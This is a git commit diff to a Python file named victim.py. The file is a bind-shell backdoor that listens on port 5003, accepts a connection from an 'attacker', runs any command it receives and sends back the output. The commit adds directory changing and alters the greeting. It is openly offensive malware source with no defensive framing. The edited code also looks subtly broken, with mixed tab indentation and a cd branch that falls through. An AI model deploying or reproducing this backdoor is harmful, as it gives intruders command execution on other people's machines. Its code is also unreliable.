6253b742108777225a2ea224a05a88d0d2d9a0cb
Nibba2018 <sohambiswas41@gmail.com>
2020-04-24 12:24:43 +0530

    added improvements.

--- victim.py
+++ victim.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
@@ -19,7 +20,7 @@ attacker_socket, attacker_address = s.accept()
 print(f"{attacker_address[0]}:{attacker_address[1]} Connected!")
 
 # just sending a message, for demonstration purposes
-message = "Hello and Welcome".encode()
+message = "Connected!!".encode()
 attacker_socket.send(message)
 
 
@@ -30,9 +31,16 @@ while True:
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
+    elif command.startswith("cd"):
+    	os.chdir(command.split()[-1])
+    	output = os.getcwd()
+    	attacker_socket.send(output.encode())
     # execute the command and retrieve the results
     output = subprocess.getoutput(command)
+    if output == None:
+    	attacker_socket.send("Done".encode())
+    else:
     # send the results back to the server
-    attacker_socket.send(output.encode())
+    	attacker_socket.send(output.encode())
 # close client connection
 attacker_socket.close()
